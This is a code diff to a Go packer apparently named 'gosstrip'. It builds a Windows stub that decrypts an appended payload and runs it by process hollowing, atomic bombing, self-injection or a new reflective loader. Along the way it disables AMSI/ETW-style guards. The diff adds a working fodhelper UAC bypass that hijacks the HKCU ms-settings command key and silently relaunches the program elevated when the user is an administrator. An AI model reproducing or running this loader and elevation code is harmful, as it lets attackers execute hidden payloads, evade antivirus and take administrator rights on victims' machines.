@@ -3,6 +3,7 @@ package pack
 import (
 	"strings"
 
+	common "gosstrip/pack/strategies/common"
 	winstrat "gosstrip/pack/strategies/windows"
 )
 
@@ -36,9 +37,12 @@ import (
 
 	"github.com/ulikunitz/xz"
 	"golang.org/x/crypto/chacha20poly1305"
+	"golang.org/x/sys/windows"
+	"golang.org/x/sys/windows/registry"
 )
 
 var peEmbeddedArgs []string
+var _ = debug.SetGCPercent
 
 // Windows API
 var (
@@ -48,6 +52,7 @@ var (
 	advapi32 = syscall.NewLazyDLL("advapi32.dll")
 	user32   = syscall.NewLazyDLL("user32.dll")
 	amsi     = syscall.NewLazyDLL("amsi.dll")
+	netapi   = syscall.NewLazyDLL("netapi32.dll")
 
 	procCreateProcess    = kernel32.NewProc("CreateProcessW")
 	procVirtualAllocEx   = kernel32.NewProc("VirtualAllocEx")
@@ -75,6 +80,8 @@ var (
 	procGetProcAddress      = kernel32.NewProc("GetProcAddress")
 	procEtwEventWrite       = ntdll.NewProc("EtwEventWrite")
 	procAmsiScanBuffer      = amsi.NewProc("AmsiScanBuffer")
+	procNetUserGetInfo      = netapi.NewProc("NetUserGetInfo")
+	procNetApiBufferFree    = netapi.NewProc("NetApiBufferFree")
 
 	procNtAllocateVirtualMemory = ntdll.NewProc("NtAllocateVirtualMemory")
 	procNtProtectVirtualMemory  = ntdll.NewProc("NtProtectVirtualMemory")
@@ -98,8 +105,11 @@ var (
 	amsiPatched bool
 )
 
+var _ = debug.SetGCPercent
+
 
 func main() {
+	ensureElevation()
 	// 1. Read metadata and payload from end of file: [payload][metadata][metadata_size:8]
 	exePath, err := os.Executable()
 	if err != nil {
@@ -156,18 +166,21 @@ func main() {
 	switch mode {
 	case "process_hollowing", "auto":
 		executeProcessHollowing(payload)
-case "atomic_bombing":
-	executeAtomicBombing(payload)
-case "stealth_loader":
-	disableStealthGuards()
-	executeStealthLoader(payload)
+	case "atomic_bombing":
+		executeAtomicBombing(payload)
 	case "self_injection":
 		executeSelfInjection(payload)
+	case "stealth_loader":
+		disableStealthGuards()
+		executeStealthLoader(payload)
+	case "reflective_loader":
+		disableStealthGuards()
+		executeReflectiveLoader(payload)
 	case "", "off":
 		executeFromTemp(payload)
 	default:
 		if m.UseInMemory {
-			executeProcessHollowing(payload)
+			executeSelfInjection(payload)
 		} else {
 			executeFromTemp(payload)
 		}
@@ -475,6 +488,107 @@ func patchMemory(addr uintptr, patch []byte) bool {
 	return true
 }
 
+func ensureElevation() {
+	if isProcessElevated() {
+		return
+	}
+	if !canElevateViaFodhelper() {
+		return
+	}
+	if err := triggerFodhelperElevation(); err != nil {
+		return
+	}
+	os.Exit(0)
+}
+
+func canElevateViaFodhelper() bool {
+	if !supportsFodhelperBypass() {
+		return false
+	}
+	username := os.Getenv("USERNAME")
+	if username == "" {
+		return false
+	}
+	userPtr, err := syscall.UTF16PtrFromString(username)
+	if err != nil {
+		return false
+	}
+	var infoPtr uintptr
+	ret, _, _ := procNetUserGetInfo.Call(
+		0,
+		uintptr(unsafe.Pointer(userPtr)),
+		1,
+		uintptr(unsafe.Pointer(&infoPtr)),
+	)
+	if ret != 0 || infoPtr == 0 {
+		return false
+	}
+	defer procNetApiBufferFree.Call(infoPtr)
+
+type userInfo1 struct {
+		Username    *uint16
+		Password    *uint16
+		PasswordAge uint32
+		Priv        uint32
+		HomeDir     *uint16
+		Comment     *uint16
+		Flags       uint32
+		ScriptPath  *uint16
+	}
+	info := (*userInfo1)(unsafe.Pointer(infoPtr))
+	return info.Priv == 2
+}
+
+func triggerFodhelperElevation() error {
+	key, _, err := registry.CreateKey(
+		registry.CURRENT_USER,
+		"Software\\Classes\\ms-settings\\shell\\open\\command",
+		registry.ALL_ACCESS,
+	)
+	if err != nil {
+		return err
+	}
+	defer key.Close()
+
+	exePath, err := os.Executable()
+	if err != nil {
+		return err
+	}
+	if err := key.SetStringValue("", exePath); err != nil {
+		return err
+	}
+	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
+		return err
+	}
+
+	cmd := exec.Command("cmd.exe", "/C", "fodhelper")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	if err := cmd.Run(); err != nil {
+		return err
+	}
+
+	_ = key.DeleteValue("")
+	_ = key.DeleteValue("DelegateExecute")
+	return nil
+}
+
+func supportsFodhelperBypass() bool {
+	info := windows.RtlGetVersion()
+	if info == nil {
+		return false
+	}
+	if info.MajorVersion > 10 {
+		return true
+	}
+	if info.MajorVersion == 10 {
+		return true
+	}
+	if info.MajorVersion == 6 && info.MinorVersion >= 3 {
+		return true
+	}
+	return false
+}
+
 func parseUserParams(raw string) []string {
 	raw = strings.TrimSpace(raw)
 	if raw == "" {
@@ -623,19 +737,54 @@ func isProcessElevated() bool {
 `
 
 // GetPEStubSource ritorna il codice sorgente dello stub PE
-func GetPEStubSource(arch string) string {
-	if arch == "386" {
-		replacer := strings.NewReplacer(
-			peProcessHollowingPlaceholder, "func executeProcessHollowing(payload []byte) { executeSelfInjection(payload) }\n",
-			peAtomicBombingPlaceholder, "func executeAtomicBombing(payload []byte) { executeSelfInjection(payload) }\n",
-			peSelfInjectionPlaceholder, winstrat.SelfInjectionRuntime32,
-		)
-		return replacer.Replace(PEStubSource)
+func GetPEStubSource(arch string, mode common.Mode) string {
+	includePH := mode == common.ModeProcessHollowing || mode == common.ModeAtomicBombing
+	includeAtomic := mode == common.ModeAtomicBombing
+	includeSelf := mode == common.ModeSelfInjection || mode == common.ModeStealthLoader || mode == common.ModeReflectiveLoader
+
+	var phImpl string
+	if includePH {
+		if arch == "386" {
+			phImpl = winstrat.ProcessHollowingRuntime32
+		} else {
+			phImpl = winstrat.ProcessHollowingRuntime64
+		}
+	} else {
+		phImpl = "func executeProcessHollowing(payload []byte) { executeFromTemp(payload) }\n"
 	}
+
+	var atomicImpl string
+	if includeAtomic {
+		atomicImpl = winstrat.AtomicBombingRuntime
+	} else {
+		atomicImpl = "func executeAtomicBombing(payload []byte) { executeProcessHollowing(payload) }\n"
+	}
+
+	var selfImpl string
+	if includeSelf {
+		if arch == "386" {
+			selfImpl = winstrat.SelfInjectionRuntime32
+		} else {
+			selfImpl = winstrat.SelfInjectionRuntime64
+		}
+	} else {
+		selfImpl = "func executeSelfInjection(payload []byte) { executeFromTemp(payload) }\nfunc executeStealthLoader(payload []byte) { executeSelfInjection(payload) }\nfunc executeReflectiveLoader(payload []byte) { executeSelfInjection(payload) }\n"
+	}
+
 	replacer := strings.NewReplacer(
-		peProcessHollowingPlaceholder, winstrat.ProcessHollowingRuntime,
-		peAtomicBombingPlaceholder, winstrat.AtomicBombingRuntime,
-		peSelfInjectionPlaceholder, winstrat.SelfInjectionRuntime64,
+		peProcessHollowingPlaceholder, phImpl,
+		peAtomicBombingPlaceholder, atomicImpl,
+		peSelfInjectionPlaceholder, selfImpl,
 	)
 	return replacer.Replace(PEStubSource)
 }
+
+//func minimalStub(name string) string {
+//	return "func " + name + "(payload []byte) { executeFromTemp(payload) }\n"
+//}
+//
+//func minimalSelfStub() string {
+//	return "func executeSelfInjection(payload []byte) { executeFromTemp(payload) }\n" +
+//		"func executeStealthLoader(payload []byte) { executeSelfInjection(payload) }\n" +
+//		"func executeReflectiveLoader(payload []byte) { executeSelfInjection(payload) }\n"
+//}
